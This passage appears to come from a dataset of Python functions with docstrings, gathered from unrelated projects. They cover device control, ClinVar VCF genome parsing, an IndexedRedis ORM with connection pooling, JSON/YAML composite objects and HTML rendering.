            "def handle_long(self, item):\n        \"\"\"Helper method for fetching a long value. Result is integer.\"\"\"\n        doc = yield from self.handle_get(item)\n        if doc is None:\n            return None\n\n        return int(doc.value.u32.text) or None"
        ],
        [
            "def get_power(self):\n        \"\"\"Check if the device is on.\"\"\"\n        power = (yield from self.handle_int(self.API.get('power')))\n        return bool(power)"
        ],
        [
            "def set_power(self, value=False):\n        \"\"\"Power on or off the device.\"\"\"\n        power = (yield from self.handle_set(\n            self.API.get('power'), int(value)))\n        return bool(power)"
        ],
        [
            "def get_modes(self):\n        \"\"\"Get the modes supported by this device.\"\"\"\n        if not self.__modes:\n            self.__modes = yield from self.handle_list(\n                self.API.get('valid_modes'))\n\n        return self.__modes"
        ],
        [
            "def get_volume_steps(self):\n        \"\"\"Read the maximum volume level of the device.\"\"\"\n        if not self.__volume_steps:\n            self.__volume_steps = yield from self.handle_int(\n                self.API.get('volume_steps'))\n\n        return self.__volume_steps"
        ],
        [
            "def get_mute(self):\n        \"\"\"Check if the device is muted.\"\"\"\n        mute = (yield from self.handle_int(self.API.get('mute')))\n        return bool(mute)"
        ],
        [
            "def set_mute(self, value=False):\n        \"\"\"Mute or unmute the device.\"\"\"\n        mute = (yield from self.handle_set(self.API.get('mute'), int(value)))\n        return bool(mute)"
        ],
        [
            "def get_play_status(self):\n        \"\"\"Get the play status of the device.\"\"\"\n        status = yield from self.handle_int(self.API.get('status'))\n        return self.PLAY_STATES.get(status)"
        ],
        [
            "def get_equalisers(self):\n        \"\"\"Get the equaliser modes supported by this device.\"\"\"\n        if not self.__equalisers:\n            self.__equalisers = yield from self.handle_list(\n                self.API.get('equalisers'))\n\n        return self.__equalisers"
        ],
        [
            "def set_sleep(self, value=False):\n        \"\"\"Set device sleep timer.\"\"\"\n        return (yield from self.handle_set(self.API.get('sleep'), int(value)))"
        ],
        [
            "def _set_range(self, start, stop, value, value_len):\n        \"\"\"\n        Assumes that start and stop are already in 'buffer' coordinates. value is a byte iterable.\n        value_len is fractional.\n        \"\"\"\n        assert stop >= start and value_len >= 0\n        range_len = stop - start\n        if range_len < value_len:\n            self._insert_zeros(stop, stop + value_len - range_len)\n            self._copy_to_range(start, value, value_len)\n        elif range_len > value_len:\n            self._del_range(stop - (range_len - value_len), stop)\n            self._copy_to_range(start, value, value_len)\n        else:\n            self._copy_to_range(start, value, value_len)"
        ],
        [
            "def _parse_genotype(self, vcf_fields):\n        \"\"\"Parse genotype from VCF line data\"\"\"\n        format_col = vcf_fields[8].split(':')\n        genome_data = vcf_fields[9].split(':')\n        try:\n            gt_idx = format_col.index('GT')\n        except ValueError:\n            return []\n        return [int(x) for x in re.split(r'[\\|/]', genome_data[gt_idx]) if\n                x != '.']"
        ],
        [
            "def toIndex(self, value):\n\t\t'''\n\t\t\ttoIndex - An optional method which will return the value prepped for index.\n\n\t\t\tBy default, \"toStorage\" will be called. If you provide \"hashIndex=True\" on the constructor,\n\t\t\tthe field will be md5summed for indexing purposes. This is useful for large strings, etc.\n\t\t'''\n\t\tif self._isIrNull(value):\n\t\t\tret = IR_NULL_STR\n\t\telse:\n\t\t\tret = self._toIndex(value)\n\n\t\tif self.isIndexHashed is False:\n\t\t\treturn ret\n\n\t\treturn md5(tobytes(ret)).hexdigest()"
        ],
        [
            "def copy(self):\n\t\t'''\n\t\t\tcopy - Create a copy of this IRField.\n\n\t\t\t  Each subclass should implement this, as you'll need to pass in the args to constructor.\n\n\t\t\t@return <IRField (or subclass)> - Another IRField that has all the same values as this one.\n\t\t'''\n\t\treturn self.__class__(name=self.name, valueType=self.valueType, defaultValue=self.defaultValue, hashIndex=self.hashIndex)"
        ],
        [
            "def objHasUnsavedChanges(self):\n\t\t'''\n\t\t\tobjHasUnsavedChanges - Check if any object has unsaved changes, cascading.\n\t\t'''\n\t\tif not self.obj:\n\t\t\treturn False\n\n\t\treturn self.obj.hasUnsavedChanges(cascadeObjects=True)"
        ],
        [
            "def assert_json_type(value: JsonValue, expected_type: JsonCheckType) -> None:\n    \"\"\"Check that a value has a certain JSON type.\n\n    Raise TypeError if the type does not match.\n\n    Supported types: str, int, float, bool, list, dict, and None.\n    float will match any number, int will only match numbers without\n    fractional part.\n\n    The special type JList(x) will match a list value where each\n    item is of type x:\n\n    >>> assert_json_type([1, 2, 3], JList(int))\n    \"\"\"\n\n    def type_name(t: Union[JsonCheckType, Type[None]]) -> str:\n        if t is None:\n            return \"None\"\n        if isinstance(t, JList):\n            return \"list\"\n        return t.__name__\n\n    if expected_type is None:\n        if value is None:\n            return\n    elif expected_type == float:\n        if isinstance(value, float) or isinstance(value, int):\n            return\n    elif expected_type in [str, int, bool, list, dict]:\n        if isinstance(value, expected_type):  # type: ignore\n            return\n    elif isinstance(expected_type, JList):\n        if isinstance(value, list):\n            for v in value:\n                assert_json_type(v, expected_type.value_type)\n            return\n    else:\n        raise TypeError(\"unsupported type\")\n    raise TypeError(\"wrong JSON type {} != {}\".format(\n        type_name(expected_type), type_name(type(value))))"
        ],
        [
            "def load(cls, fh):\n        \"\"\"\n        Load json or yaml data from file handle.\n\n        Args:\n            fh (file): File handle to load from.\n\n        Examlple:\n            >>> with open('data.json', 'r') as json:\n            >>>    jsdata = composite.load(json)\n            >>>\n            >>> with open('data.yml', 'r') as yml:\n            >>>    ymldata = composite.load(yml)\n        \"\"\"\n        dat = fh.read()\n        try:\n            ret = cls.from_json(dat)\n        except:\n            ret = cls.from_yaml(dat)\n        return ret"
        ],
        [
            "def from_json(cls, fh):\n        \"\"\"\n        Load json from file handle.\n\n        Args:\n            fh (file): File handle to load from.\n\n        Examlple:\n            >>> with open('data.json', 'r') as json:\n            >>>    data = composite.load(json)\n        \"\"\"\n        if isinstance(fh, str):\n            return cls(json.loads(fh))\n        else:\n            return cls(json.load(fh))"
        ],
        [
            "def intersection(self, other, recursive=True):\n        \"\"\"\n        Recursively compute intersection of data. For dictionaries, items\n        for specific keys will be reduced to unique items. For lists, items\n        will be reduced to unique items. This method is meant to be analogous\n        to set.intersection for composite objects.\n\n        Args:\n            other (composite): Other composite object to intersect with.\n            recursive (bool): Whether or not to perform the operation recursively,\n                for all nested composite objects.\n        \"\"\"\n        if not isinstance(other, composite):\n            raise AssertionError('Cannot intersect composite and {} types'.format(type(other)))\n        \n        if self.meta_type != other.meta_type:\n            return composite({})\n\n        if self.meta_type == 'list':\n            keep = []\n            for item in self._list:\n                if item in other._list:\n                    if recursive and isinstance(item, composite):\n                        keep.extend(item.intersection(other.index(item), recursive=True))\n                    else:\n                        keep.append(item)\n            return composite(keep)\n        elif self.meta_type == 'dict':\n            keep = {}\n            for key in self._dict:\n                item = self._dict[key]\n                if key in other._dict:\n                    if recursive and \\\n                       isinstance(item, composite) and \\\n                       isinstance(other.get(key), composite):\n                       keep[key] = item.intersection(other.get(key), recursive=True)\n                    elif item == other[key]:\n                        keep[key] = item\n            return composite(keep)\n        return"
        ],
        [
            "def union(self, other, recursive=True, overwrite=False):\n        \"\"\"\n        Recursively compute union of data. For dictionaries, items\n        for specific keys will be combined into a list, depending on the\n        status of the overwrite= parameter. For lists, items will be appended\n        and reduced to unique items. This method is meant to be analogous\n        to set.union for composite objects.\n\n        Args:\n            other (composite): Other composite object to union with.\n            recursive (bool): Whether or not to perform the operation recursively,\n                for all nested composite objects.\n            overwrite (bool): Whether or not to overwrite entries with the same\n                key in a nested dictionary. \n        \"\"\"\n        if not isinstance(other, composite):\n            raise AssertionError('Cannot union composite and {} types'.format(type(other)))\n        \n        if self.meta_type != other.meta_type:\n            return composite([self, other])\n\n        if self.meta_type == 'list':\n            keep = []\n            for item in self._list:\n                keep.append(item)\n            for item in other._list:\n                if item not in self._list:\n                    keep.append(item)\n            return composite(keep)\n        elif self.meta_type == 'dict':\n            keep = {}\n            for key in list(set(list(self._dict.keys()) + list(other._dict.keys()))):\n                left = self._dict.get(key)\n                right = other._dict.get(key)\n                if recursive and \\\n                   isinstance(left, composite) and \\\n                   isinstance(right, composite):\n                    keep[key] = left.union(right, recursive=recursive, overwrite=overwrite)\n                elif left == right:\n                    keep[key] = left\n                elif left is None:\n                    keep[key] = right\n                elif right is None:\n                    keep[key] = left\n                elif overwrite:\n                    keep[key] = right\n                else:\n                    keep[key] = composite([left, right])\n            return composite(keep)\n        return"
        ],
        [
            "def append(self, item):\n        \"\"\"\n        Append to object, if object is list.\n        \"\"\"\n        if self.meta_type == 'dict':\n            raise AssertionError('Cannot append to object of `dict` base type!')\n        if self.meta_type == 'list':\n            self._list.append(item)\n        return"
        ],
        [
            "def extend(self, item):\n        \"\"\"\n        Extend list from object, if object is list.\n        \"\"\"\n        if self.meta_type == 'dict':\n            raise AssertionError('Cannot extend to object of `dict` base type!')\n        if self.meta_type == 'list':\n            self._list.extend(item)\n        return"
        ],
        [
            "def write_json(self, fh, pretty=True):\n        \"\"\"\n        Write composite object to file handle in JSON format.\n\n        Args:\n            fh (file): File handle to write to.\n            pretty (bool): Sort keys and indent in output.\n        \"\"\"\n        sjson = json.JSONEncoder().encode(self.json())\n        if pretty:\n            json.dump(json.loads(sjson), fh, sort_keys=True, indent=4)\n        else:\n            json.dump(json.loads(sjson), fh)\n        return"
        ],
        [
            "def filelist(self):\n        \"\"\"\n        Return list of files in filetree.\n        \"\"\"\n        if len(self._filelist) == 0:\n            for item in self._data:\n                if isinstance(self._data[item], filetree):\n                    self._filelist.extend(self._data[item].filelist())\n                else:\n                    self._filelist.append(self._data[item])\n        return self._filelist"
        ],
        [
            "def prune(self, regex=r\".*\"):\n        \"\"\"\n        Prune leaves of filetree according to specified\n        regular expression.\n\n        Args:\n            regex (str): Regular expression to use in pruning tree.\n        \"\"\"\n        return filetree(self.root, ignore=self.ignore, regex=regex)"
        ],
        [
            "def deref(self, ctx):\n        \"\"\"\n        Returns the value this reference is pointing to. This method uses 'ctx' to resolve the reference and return\n        the value this reference references.\n        If the call was already made, it returns a cached result.\n        It also makes sure there's no cyclic reference, and if so raises CyclicReferenceError.\n        \"\"\"\n        if self in ctx.call_nodes:\n            raise CyclicReferenceError(ctx, self)\n\n        if self in ctx.cached_results:\n            return ctx.cached_results[self]\n\n        try:\n            ctx.call_nodes.add(self)\n            ctx.call_stack.append(self)\n\n            result = self.evaluate(ctx)\n            ctx.cached_results[self] = result\n            return result\n        except:\n            if ctx.exception_call_stack is None:\n                ctx.exception_call_stack = list(ctx.call_stack)\n            raise\n        finally:\n            ctx.call_stack.pop()\n            ctx.call_nodes.remove(self)"
        ],
        [
            "def delete(self):\n\t\t'''\n\t\t\tdelete - Delete all objects in this list.\n\n\t\t\t@return <int> - Number of objects deleted\n\t\t'''\n\t\tif len(self) == 0:\n\t\t\treturn 0\n\t\tmdl = self.getModel()\n\t\treturn mdl.deleter.deleteMultiple(self)"
        ],
        [
            "def save(self):\n\t\t'''\n\t\t\tsave - Save all objects in this list\n\t\t'''\n\t\tif len(self) == 0:\n\t\t\treturn []\n\t\tmdl = self.getModel()\n\t\treturn mdl.saver.save(self)"
        ],
        [
            "def reload(self):\n\t\t'''\n\t\t\treload - Reload all objects in this list. \n\t\t\t\tUpdates in-place. To just fetch all these objects again, use \"refetch\"\n\n\t\t\t@return - List (same order as current objects) of either exception (KeyError) if operation failed,\n\t\t\t  or a dict of fields changed -> (old, new)\n\t\t'''\n\t\tif len(self) == 0:\n\t\t\treturn []\n\n\t\tret = []\n\t\tfor obj in self:\n\t\t\tres = None\n\t\t\ttry:\n\t\t\t\tres = obj.reload()\n\t\t\texcept Exception as e:\n\t\t\t\tres = e\n\n\t\t\tret.append(res)\n\n\t\treturn ret"
        ],
        [
            "def refetch(self):\n\t\t'''\n\t\t\trefetch - Fetch a fresh copy of all items in this list.\n\t\t\t\tReturns a new list. To update in-place, use \"reload\".\n\n\t\t\t@return IRQueryableList<IndexedRedisModel> - List of fetched items\n\t\t'''\n\n\t\tif len(self) == 0:\n\t\t\treturn IRQueryableList()\n\n\t\tmdl = self.getModel()\n\t\tpks = [item._id for item in self if item._id]\n\n\t\treturn mdl.objects.getMultiple(pks)"
        ],
        [
            "def render(self, *args, **kwargs):\n        '''Renders as a str'''\n        render_to = StringIO()\n        self.output(render_to, *args, **kwargs)\n        return render_to.getvalue()"
        ],
        [
            "def start_tag(self):\n        '''Returns the elements HTML start tag'''\n        direct_attributes = (attribute.render(self) for attribute in self.render_attributes)\n        attributes = ()\n        if hasattr(self, '_attributes'):\n            attributes = ('{0}=\"{1}\"'.format(key, value)\n                                             for key, value in self.attributes.items() if value)\n\n        rendered_attributes = \" \".join(filter(bool, chain(direct_attributes, attributes)))\n        return '<{0}{1}{2}{3}>'.format(self.tag, ' ' if rendered_attributes else '',\n                                       rendered_attributes, ' /' if self.tag_self_closes else \"\")"
        ],
        [
            "def safe_repr(obj):\n    \"\"\"Returns a repr of an object and falls back to a minimal representation of type and ID if the call to repr raised\n    an error.\n\n    :param obj: object to safe repr\n    :returns: repr string or '(type<id> repr error)' string\n    :rtype: str\n    \"\"\"\n    try:\n        obj_repr = repr(obj)\n    except:\n        obj_repr = \"({0}<{1}> repr error)\".format(type(obj), id(obj))\n    return obj_repr"
        ],
        [
            "def match_to_clinvar(genome_file, clin_file):\n    \"\"\"\n    Match a genome VCF to variants in the ClinVar VCF file\n\n    Acts as a generator, yielding tuples of:\n    (ClinVarVCFLine, ClinVarAllele, zygosity)\n\n    'zygosity' is a string and corresponds to the genome's zygosity for that\n    ClinVarAllele. It can be either: 'Het' (heterozygous), 'Hom' (homozygous),\n    or 'Hem' (hemizygous, e.g. X chromosome in XY individuals).\n    \"\"\"\n    clin_curr_line = _next_line(clin_file)\n    genome_curr_line = _next_line(genome_file)\n\n    # Ignores all the lines that start with a hashtag\n    while clin_curr_line.startswith('#'):\n        clin_curr_line = _next_line(clin_file)\n    while genome_curr_line.startswith('#'):\n        genome_curr_line = _next_line(genome_file)\n\n    # Advance through both files simultaneously to find matches\n    while clin_curr_line and genome_curr_line:\n\n        # Advance a file when positions aren't equal.\n        clin_curr_pos = VCFLine.get_pos(clin_curr_line)\n        genome_curr_pos = VCFLine.get_pos(genome_curr_line)\n        try:\n            if clin_curr_pos['chrom'] > genome_curr_pos['chrom']:\n                genome_curr_line = _next_line(genome_file)\n                continue\n            elif clin_curr_pos['chrom'] < genome_curr_pos['chrom']:\n                clin_curr_line = _next_line(clin_file)\n                continue\n            if clin_curr_pos['pos'] > genome_curr_pos['pos']:\n                genome_curr_line = _next_line(genome_file)\n                continue\n            elif clin_curr_pos['pos'] < genome_curr_pos['pos']:\n                clin_curr_line = _next_line(clin_file)\n                continue\n        except StopIteration:\n            break\n\n        # If we get here, start positions match.\n        # Look for allele matching.\n        genome_vcf_line = GenomeVCFLine(vcf_line=genome_curr_line,\n                                        skip_info=True)\n        # We can skip if genome has no allele information for this point.\n        if not genome_vcf_line.genotype_allele_indexes:\n            genome_curr_line = _next_line(genome_file)\n            continue\n\n        # Match only if ClinVar and Genome ref_alleles match.\n        clinvar_vcf_line = ClinVarVCFLine(vcf_line=clin_curr_line)\n        if not genome_vcf_line.ref_allele == clinvar_vcf_line.ref_allele:\n            try:\n                genome_curr_line = _next_line(genome_file)\n                clin_curr_line = _next_line(clin_file)\n                continue\n            except StopIteration:\n                break\n\n        # Determine genome alleles and zygosity. Zygosity is assumed to be one\n        # of: heterozygous, homozygous, or hemizygous.\n        genotype_allele_indexes = genome_vcf_line.genotype_allele_indexes\n        genome_alleles = [genome_vcf_line.alleles[x] for\n                          x in genotype_allele_indexes]\n        if len(genome_alleles) == 1:\n            zygosity = 'Hem'\n        elif len(genome_alleles) == 2:\n            if genome_alleles[0].sequence == genome_alleles[1].sequence:\n                zygosity = 'Hom'\n                genome_alleles = [genome_alleles[0]]\n            else:\n                zygosity = 'Het'\n        else:\n            raise ValueError('This code only expects to work on genomes ' +\n                             'with one or two alleles called at each ' +\n                             'location. The following line violates this:' +\n                             str(genome_vcf_line))\n\n        # Look for matches to ClinVar alleles.\n        for genome_allele in genome_alleles:\n            for allele in clinvar_vcf_line.alleles:\n                if genome_allele.sequence == allele.sequence:\n                    # The 'records' attribute is specific to ClinVarAlleles.\n                    if hasattr(allele, 'records'):\n                        yield (genome_vcf_line, allele, zygosity)\n\n        # Done matching, move on.\n        try:\n            genome_curr_line = _next_line(genome_file)\n            clin_curr_line = _next_line(clin_file)\n        except StopIteration:\n            break"
        ],
        [
            "def as_dict(self):\n        \"\"\"Return Allele data as dict object.\"\"\"\n        self_as_dict = dict()\n        self_as_dict['sequence'] = self.sequence\n        if hasattr(self, 'frequency'):\n            self_as_dict['frequency'] = self.frequency\n        return self_as_dict"
        ],
        [
            "def _parse_allele_data(self):\n        \"\"\"Create list of Alleles from VCF line data\"\"\"\n        return [Allele(sequence=x) for x in\n                [self.ref_allele] + self.alt_alleles]"
        ],
        [
            "def _parse_info(self, info_field):\n        \"\"\"Parse the VCF info field\"\"\"\n        info = dict()\n        for item in info_field.split(';'):\n            # Info fields may be \"foo=bar\" or just \"foo\".\n            # For the first case, store key \"foo\" with value \"bar\"\n            # For the second case, store key \"foo\" with value True.\n            info_item_data = item.split('=')\n            # If length is one, just store as a key with value = true.\n            if len(info_item_data) == 1:\n                info[info_item_data[0]] = True\n            elif len(info_item_data) == 2:\n                info[info_item_data[0]] = info_item_data[1]\n        return info"
        ],
        [
            "def as_dict(self):\n        \"\"\"Dict representation of parsed VCF data\"\"\"\n        self_as_dict = {'chrom': self.chrom,\n                        'start': self.start,\n                        'ref_allele': self.ref_allele,\n                        'alt_alleles': self.alt_alleles,\n                        'alleles': [x.as_dict() for x in self.alleles]}\n        try:\n            self_as_dict['info'] = self.info\n        except AttributeError:\n            pass\n        return self_as_dict"
        ],
        [
            "def get_pos(vcf_line):\n        \"\"\"\n        Very lightweight parsing of a vcf line to get position.\n\n        Returns a dict containing:\n        'chrom': index of chromosome (int), indicates sort order\n        'pos': position on chromosome (int)\n        \"\"\"\n        if not vcf_line:\n            return None\n        vcf_data = vcf_line.strip().split('\\t')\n        return_data = dict()\n        return_data['chrom'] = CHROM_INDEX[vcf_data[0]]\n        return_data['pos'] = int(vcf_data[1])\n        return return_data"
        ],
        [
            "def _toStorage(self, value):\n\t\t'''\n\t\t\t_toStorage - Convert the value to a string representation for storage.\n\n\t\t\t@param value - The value of the item to convert\n\t\t\t@return A string value suitable for storing.\n\t\t'''\n\n\t\tfor chainedField in self.chainedFields:\n\t\t\tvalue = chainedField.toStorage(value)\n\n\t\treturn value"
        ],
        [
            "def nav_to_vcf_dir(ftp, build):\n    \"\"\"\n    Navigate an open ftplib.FTP to appropriate directory for ClinVar VCF files.\n\n    Args:\n        ftp:   (type: ftplib.FTP) an open connection to ftp.ncbi.nlm.nih.gov\n        build: (type: string) genome build, either 'b37' or 'b38'\n    \"\"\"\n    if build == 'b37':\n        ftp.cwd(DIR_CLINVAR_VCF_B37)\n    elif build == 'b38':\n        ftp.cwd(DIR_CLINVAR_VCF_B38)\n    else:\n        raise IOError(\"Genome build not recognized.\")"
        ],
        [
            "def as_dict(self, *args, **kwargs):\n        \"\"\"Return ClinVarAllele data as dict object.\"\"\"\n        self_as_dict = super(ClinVarAllele, self).as_dict(*args, **kwargs)\n        self_as_dict['hgvs'] = self.hgvs\n        self_as_dict['clnalleleid'] = self.clnalleleid\n        self_as_dict['clnsig'] = self.clnsig\n        self_as_dict['clndn'] = self.clndn\n        self_as_dict['clndisdb'] = self.clndisdb\n        self_as_dict['clnvi'] = self.clnvi\n        return self_as_dict"
        ],
        [
            "def _parse_frequencies(self):\n        \"\"\"Parse frequency data in ClinVar VCF\"\"\"\n        frequencies = OrderedDict([\n            ('EXAC', 'Unknown'),\n            ('ESP', 'Unknown'),\n            ('TGP', 'Unknown')])\n        pref_freq = 'Unknown'\n        for source in frequencies.keys():\n            freq_key = 'AF_' + source\n            if freq_key in self.info:\n                frequencies[source] = self.info[freq_key]\n                if pref_freq == 'Unknown':\n                    pref_freq = frequencies[source]\n        return pref_freq, frequencies"
        ],
        [
            "def _parse_allele_data(self):\n        \"\"\"Parse alleles for ClinVar VCF, overrides parent method.\"\"\"\n\n        # Get allele frequencies if they exist.\n        pref_freq, frequencies = self._parse_frequencies()\n\n        info_clnvar_single_tags = ['ALLELEID', 'CLNSIG', 'CLNHGVS']\n        cln_data = {x.lower(): self.info[x] if x in self.info else None\n                    for x in info_clnvar_single_tags}\n        cln_data.update(\n            {'clndisdb': [x.split(',') for x in\n                          self.info['CLNDISDB'].split('|')]\n             if 'CLNDISDB' in self.info else []})\n        cln_data.update({'clndn': self.info['CLNDN'].split('|') if\n                         'CLNDN' in self.info else []})\n        cln_data.update({'clnvi': self.info['CLNVI'].split(',')\n                        if 'CLNVI' in self.info else []})\n\n        try:\n            sequence = self.alt_alleles[0]\n        except IndexError:\n            sequence = self.ref_allele\n\n        allele = ClinVarAllele(frequency=pref_freq, sequence=sequence,\n                               **cln_data)\n\n        # A few ClinVar variants are only reported as a combination with\n        # other variants, and no single-variant effect is proposed. Skip these.\n        if not cln_data['clnsig']:\n            return []\n\n        return [allele]"
        ],
        [
            "def add(self, *names):\n        '''Returns back a class decorator that enables registering Blox to this factory'''\n        def decorator(blok):\n            for name in names or (blok.__name__, ):\n                self[name] = blok\n            return blok\n        return decorator"
        ],
        [
            "def depricated_name(newmethod):\n    \"\"\"\n    Decorator for warning user of depricated functions before use.\n\n    Args:\n        newmethod (str): Name of method to use instead.\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            warnings.simplefilter('always', DeprecationWarning) \n            warnings.warn(\n                \"Function {} is depricated, please use {} instead.\".format(func.__name__, newmethod),\n                category=DeprecationWarning, stacklevel=2\n            )\n            warnings.simplefilter('default', DeprecationWarning)\n            return func(*args, **kwargs)\n        return wrapper\n    return decorator"
        ],
        [
            "def setDefaultRedisConnectionParams( connectionParams ):\n\t'''\n\t\tsetDefaultRedisConnectionParams - Sets the default parameters used when connecting to Redis.\n\n\t\t  This should be the args to redis.Redis in dict (kwargs) form.\n\n\t\t  @param connectionParams <dict> - A dict of connection parameters.\n\t\t    Common keys are:\n\n\t\t       host <str> - hostname/ip of Redis server (default '127.0.0.1')\n\t\t       port <int> - Port number\t\t\t(default 6379)\n\t\t       db  <int>  - Redis DB number\t\t(default 0)\n\n\t\t   Omitting any of those keys will ensure the default value listed is used.\n\n\t\t  This connection info will be used by default for all connections to Redis, unless explicitly set otherwise.\n\t\t  The common way to override is to define REDIS_CONNECTION_PARAMS on a model, or use AltConnectedModel = MyModel.connectAlt( PARAMS )\n\n\t\t  Any omitted fields in these connection overrides will inherit the value from the global default.\n\n\t\t  For example, if your global default connection params define host = 'example.com', port=15000, and db=0, \n\t\t    and then one of your models has\n\t\t       \n\t\t       REDIS_CONNECTION_PARAMS = { 'db' : 1 }\n\t\t    \n\t\t    as an attribute, then that model's connection will inherit host='example.com\" and port=15000 but override db and use db=1\n\n\n\t\t    NOTE: Calling this function will clear the connection_pool attribute of all stored managed connections, disconnect all managed connections,\n\t\t      and close-out the connection pool.\n\t\t     It may not be safe to call this function while other threads are potentially hitting Redis (not that it would make sense anyway...)\n\n\t\t     @see clearRedisPools   for more info\n\t'''\n\tglobal _defaultRedisConnectionParams\n\t_defaultRedisConnectionParams.clear()\n\n\tfor key, value in connectionParams.items():\n\t\t_defaultRedisConnectionParams[key] = value\n\t\n\tclearRedisPools()"
        ],
        [
            "def clearRedisPools():\n\t'''\n\t\tclearRedisPools - Disconnect all managed connection pools, \n\t\t   and clear the connectiobn_pool attribute on all stored managed connection pools.\n\n\t\t   A \"managed\" connection pool is one where REDIS_CONNECTION_PARAMS does not define the \"connection_pool\" attribute.\n\t\t   If you define your own pools, IndexedRedis will use them and leave them alone.\n\n\t\t  This method will be called automatically after calling setDefaultRedisConnectionParams.\n\n\t\t  Otherwise, you shouldn't have to call it.. Maybe as some sort of disaster-recovery call..\n\t'''\n\tglobal RedisPools\n\tglobal _redisManagedConnectionParams\n\n\tfor pool in RedisPools.values():\n\t\ttry:\n\t\t\tpool.disconnect()\n\t\texcept:\n\t\t\tpass\n\t\n\tfor paramsList in _redisManagedConnectionParams.values():\n\t\tfor params in paramsList:\n\t\t\tif 'connection_pool' in params:\n\t\t\t\tdel params['connection_pool']\n\t\n\tRedisPools.clear()\n\t_redisManagedConnectionParams.clear()"
        ],
        [
            "def getRedisPool(params):\n\t'''\n\t\tgetRedisPool - Returns and possibly also creates a Redis connection pool\n\t\t\tbased on the REDIS_CONNECTION_PARAMS passed in.\n\n\t\t\tThe goal of this method is to keep a small connection pool rolling\n\t\t\tto each unique Redis instance, otherwise during network issues etc\n\t\t\tpython-redis will leak connections and in short-order can exhaust\n\t\t\tall the ports on a system. There's probably also some minor\n\t\t\tperformance gain in sharing Pools.\n\n\t\t\tWill modify \"params\", if \"host\" and/or \"port\" are missing, will fill\n\t\t\tthem in with defaults, and prior to return will set \"connection_pool\"\n\t\t\ton params, which will allow immediate return on the next call,\n\t\t\tand allow access to the pool directly from the model object.\n\n\t\t\t@param params <dict> - REDIS_CONNECTION_PARAMS - kwargs to redis.Redis\n\n\t\t\t@return redis.ConnectionPool corrosponding to this unique server.\n\t'''\n\tglobal RedisPools\n\tglobal _defaultRedisConnectionParams\n\tglobal _redisManagedConnectionParams\n\n\tif not params:\n\t\tparams = _defaultRedisConnectionParams\n\t\tisDefaultParams = True\n\telse:\n\t\tisDefaultParams = bool(params is _defaultRedisConnectionParams)\n\n\tif 'connection_pool' in params:\n\t\treturn params['connection_pool']\n\n\thashValue = hashDictOneLevel(params)\n\n\tif hashValue in RedisPools:\n\t\tparams['connection_pool'] = RedisPools[hashValue]\n\t\treturn RedisPools[hashValue]\n\t\n\t# Copy the params, so that we don't modify the original dict\n\tif not isDefaultParams:\n\t\torigParams = params\n\t\tparams = copy.copy(params)\n\telse:\n\t\torigParams = params\n\n\tcheckAgain = False\n\tif 'host' not in params:\n\t\tif not isDefaultParams and 'host' in _defaultRedisConnectionParams:\n\t\t\tparams['host'] = _defaultRedisConnectionParams['host']\n\t\telse:\n\t\t\tparams['host'] = '127.0.0.1'\n\t\tcheckAgain = True\n\tif 'port' not in params:\n\t\tif not isDefaultParams and 'port' in _defaultRedisConnectionParams:\n\t\t\tparams['port'] = _defaultRedisConnectionParams['port']\n\t\telse:\n\t\t\tparams['port'] = 6379\n\t\tcheckAgain = True\n\t\n\tif 'db' not in params:\n\t\tif not isDefaultParams and 'db' in _defaultRedisConnectionParams:\n\t\t\tparams['db'] = _defaultRedisConnectionParams['db']\n\t\telse:\n\t\t\tparams['db'] = 0\n\t\tcheckAgain = True\n\n\n\tif not isDefaultParams:\n\t\totherGlobalKeys = set(_defaultRedisConnectionParams.keys()) - set(params.keys())\n\t\tfor otherKey in otherGlobalKeys:\n\t\t\tif otherKey == 'connection_pool':\n\t\t\t\tcontinue\n\t\t\tparams[otherKey] = _defaultRedisConnectionParams[otherKey]\n\t\t\tcheckAgain = True\n\n\tif checkAgain:\n\t\thashValue = hashDictOneLevel(params)\n\t\tif hashValue in RedisPools:\n\t\t\tparams['connection_pool'] = RedisPools[hashValue]\n\t\t\treturn RedisPools[hashValue]\n\n\tconnectionPool = redis.ConnectionPool(**params)\n\torigParams['connection_pool'] = params['connection_pool'] = connectionPool\n\tRedisPools[hashValue] = connectionPool\n\n\t# Add the original as a \"managed\" redis connection (they did not provide their own pool)\n\t#   such that if the defaults change, we make sure to re-inherit any keys, and can disconnect\n\t#   from clearRedisPools\n\torigParamsHash = hashDictOneLevel(origParams)\n\tif origParamsHash not in _redisManagedConnectionParams:\n\t\t_redisManagedConnectionParams[origParamsHash] = [origParams]\n\telif origParams not in _redisManagedConnectionParams[origParamsHash]:\n\t\t_redisManagedConnectionParams[origParamsHash].append(origParams)\n\n\n\treturn connectionPool"
        ],
        [
            "def pprint(self, stream=None):\n\t\t'''\n\t\t\tpprint - Pretty-print a dict representation of this object.\n\n\t\t\t@param stream <file/None> - Either a stream to output, or None to default to sys.stdout\n\t\t'''\n\t\tpprint.pprint(self.asDict(includeMeta=True, forStorage=False, strKeys=True), stream=stream)"
        ],
        [
            "def hasUnsavedChanges(self, cascadeObjects=False):\n\t\t'''\n\t\t\thasUnsavedChanges - Check if any unsaved changes are present in this model, or if it has never been saved.\n\n\t\t\t@param cascadeObjects <bool> default False, if True will check if any foreign linked objects themselves have unsaved changes (recursively).\n\t\t\t\tOtherwise, will just check if the pk has changed.\n\n\t\t\t@return <bool> - True if any fields have changed since last fetch, or if never saved. Otherwise, False\n\t\t'''\n\t\tif not self._id or not self._origData:\n\t\t\treturn True\n\n\t\tfor thisField in self.FIELDS:\n\t\t\tthisVal = object.__getattribute__(self, thisField)\n\t\t\tif self._origData.get(thisField, '') != thisVal:\n\t\t\t\treturn True\n\n\t\t\tif cascadeObjects is True and issubclass(thisField.__class__, IRForeignLinkFieldBase):\n\t\t\t\tif thisVal.objHasUnsavedChanges():\n\t\t\t\t\treturn True\n\n\t\treturn False"
        ],
        [
